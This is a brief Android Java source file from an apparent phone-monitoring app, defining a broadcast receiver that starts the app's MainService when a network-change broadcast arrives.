package com.monitor.phone.s0ft.phonemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;


public class NetworkChangeBroadcastReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(final Context context, Intent intent) {
        Intent startMainServiceIntent = new Intent(context, MainService.class);
        context.startService(startMainServiceIntent);
    }
}
